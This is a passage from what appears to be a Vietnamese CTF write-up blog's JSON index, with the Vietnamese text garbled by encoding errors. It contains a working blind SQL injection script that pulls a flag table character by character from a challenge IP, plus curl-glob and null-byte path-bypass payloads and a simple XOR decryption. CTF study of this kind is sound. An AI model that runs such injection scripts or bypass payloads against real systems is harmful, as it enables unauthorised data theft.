 quote(payload)        urlx = url + payload        #print(urlx)        r=requests.get(url=urlx)        if \"id\" in r.text:            table_name += ps            print(\"Table names: \",table_name)            haha +=1    if haha &lt; i:        breakprint(\"Success all the names of the tables are:\",table_name)  VÃ  tÃ¬m ra Ä‘Æ°á»£c tÃªn cá»§a cÃ¡c báº£ng lÃ Tables: API,flag_c1abd148_acae_40be_a953_eae333f90da0  BÃ¢y giá» dá»±a vÃ o cÃ¡i trÃªn láº¥y ra flag tá»« báº£ng flag_c1abd148_acae_40be_a953_eae333f90da0 thÃ´i  Script cá»§a mÃ¬nhimport string,requestsfrom urllib.parse import quoteall_characters = string.ascii_letters + string.digits + \"!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}\"url = \"http://45.122.249.68:20020/search?name[]=\"table_name = \"flag_c1abd148_acae_40be_a953_eae333f90da0\"#payload = \"1' and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is 'a'--\"haha = 0flag =\"\"for i in range(1,10000):    for ps in all_characters:        payload =\"1' and substr((select flag from %s),%d,1) is '%c'--\" %(table_name,i,ps)        payload =  quote(payload)        urlx = url + payload        #print(urlx)        r=requests.get(url=urlx)        if \"id\" in r.text:            flag += ps            print(\"Flag is: \",flag)            haha +=1    if haha &lt; i:        breakprint(\"Here is your flag:\",flag)  Flag: W1{I_th1nk_u_r_so_lite^_^}    BÃ i 4 Differences:        Flag ngay á»Ÿ trong file  Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????}    BÃ i 5 Free Flag:        Äá»c file pcapng ta tÃ¬m Ä‘Æ°á»£c source vÃ  keyimport base64BANNER = \"\"\" ___       __   ________  ________   ________   ________  ___       __     _____  ________      |\\  \\     |\\  \\|\\   __  \\|\\   ___  \\|\\   ___  \\|\\   __  \\|\\  \\     |\\  \\  / __  \\|\\   ___  \\    \\ \\  \\    \\ \\  \\ \\  \\|\\  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\  \\|\\  \\ \\  \\    \\ \\  \\|\\/_|\\  \\ \\  \\\\\\ \\  \\    \\ \\  \\  __\\ \\  \\ \\   __  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\   __  \\ \\  \\  __\\ \\  \\|/ \\ \\  \\ \\  \\\\\\ \\  \\    \\ \\  \\|\\__\\_\\  \\ \\  \\ \\  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\  \\ \\  \\ \\  \\|\\__\\_\\  \\   \\ \\  \\ \\  \\\\\\ \\  \\    \\ \\____________\\ \\__\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\ \\__\\ \\____________\\   \\ \\__\\ \\__\\\\\\ \\__\\\\    \\|____________|\\|__|\\|__|\\|__| \\|__|\\|__| \\|__|\\|__|\\|__|\\|____________|    \\|__|\\|__| \\|__|\"\"\"KEY = bytes.fromhex('deadbeef')def encryptSecret(secret):    lst_byte = []    for i in range(len(secret)):        enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)]        lst_byte.append(enc_byte.to_bytes(1, 'big'))        return base64.b64encode(b''.join([_ for _ in lst_byte])).decode()if __name__=='__main__':    print(BANNER)    secret = input(\"&gt; Please give me your secret: \")    print(\"\\n&gt; Here is your encrypted secret:\", encryptSecret(secret)  Decrypt láº¡i ta sáº½ cÃ³ flagimport base64KEY = bytes.fromhex('deadbeef')def decryptSecret(encrypted_secret):    encrypted_bytes = base64.b64decode(encrypted_secret.encode())    decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))]    decrypted_text = ''.join([chr(byte) for byte in decrypted_bytes])    return decrypted_textsecret = \"iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=\"print(decryptSecret(secret))  Flag: W1{w3llC0mE_tO_w4nNaw1N}  Máº¥y bÃ i cÃ²n láº¡i mÃ¬nh chÆ°a biáº¿t lÃ m do dark quÃ¡"
  },
  
  {
    "title": "Asis CTF 2023 Writeup",
    "url": "/posts/AsisCTF/",
    "categories": "CTF Writeup",
    "tags": "",
    "date": "2023-09-24 23:00:00 +0700",
    





    
    "snippet": "Asis-CTF-2023-WriteupBÃ i 1 hello:  TÃ³m táº¯t Ä‘á» thÃ¬ Ä‘áº¡i khÃ¡i lÃ  Ä‘á» báº£o chÃºng ta pháº£i request má»™t cÃ¡i method get cÃ³ parameter lÃ  x lÃªn Web sao cho khÃ´ng cÃ³ chá»¯ next vÃ  chá»¯ file lÃ  Ä‘Æ°á»£c, nhÆ°ng mÃ  muá»‘n ...",
    "content": "Asis-CTF-2023-WriteupBÃ i 1 hello:  TÃ³m táº¯t Ä‘á» thÃ¬ Ä‘áº¡i khÃ¡i lÃ  Ä‘á» báº£o chÃºng ta pháº£i request má»™t cÃ¡i method get cÃ³ parameter lÃ  x lÃªn Web sao cho khÃ´ng cÃ³ chá»¯ next vÃ  chá»¯ file lÃ  Ä‘Æ°á»£c, nhÆ°ng mÃ  muá»‘n Ä‘á»c Ä‘Æ°á»£c flag thÃ¬ pháº£i Ä‘á»c Ä‘Æ°á»£c file next.txt  Äá»c Ä‘á», Ä‘á» gá»£i Ã½ cho mÃ¬nh Ä‘á»c manpage cá»§a curl  Sau khi Ä‘á»c vÃ  phÃ¢n tÃ­ch manpage mÃ¬nh Ä‘Ã£ nháº­n ra cÃ¡ch lÃ m cá»§a bÃ i nÃ y dá»±a vÃ o chá»©c nÄƒng bÃªn dÆ°á»›i  ÄÃ¢y lÃ  payload cá»§a mÃ¬nh ?x=f[a-i]le:///ne[b-x]t.txt  Khi bypass Ä‘Æ°á»£c Ä‘oáº¡n Ä‘áº§u tiÃªn nÃ³ sáº½ hiá»‡n ra 1 Ä‘Æ°á»ng dáº«n má»›i  Theo Ä‘Æ°á»ng dáº«n, Ä‘i tá»›i Ä‘oáº¡n thá»© 2  Decode Base64 ra Ä‘á»ƒ láº¥y ná»™i dung  Cháº¯c cháº¯n /app/index.js lÃ  source nÃªn mÃ¬nh Ä‘Ã£ Ä‘á»c nÃ³  Decode tiáº¿p thÃ¬ ra source code  Code nÃ y Ä‘áº¡i khÃ¡i lÃ  cÅ©ng nhÆ° cÃ¡i Ä‘áº§u báº¯t mÃ¬nh Ä‘á»c file /next.txt nhÆ°ng láº¡i cáº¥m chá»¯ next  Sau khi phÃ¢n tÃ­ch code nháº­n ra lá»—i á»Ÿ 2 chá»• nÃ y  path.basename(fpath) sáº½ tráº£ láº¡i cÃ¡i tÃªn file vá» cho mÃ¬nh cÃ²n fs.readFileSync(fpath) sáº½ Ä‘á»c file cá»§a fpath  Sau má»™t sá»‘ thá»­ nghiá»‡m thÃ¬ Ä‘Ã¢y lÃ  payload cuá»‘i cÃ¹ng cá»§a mÃ¬nh /next.txt%00/yuu.txt  Decode  Decode  Flag: ASIS{good_job_bun}"
  }
  
]

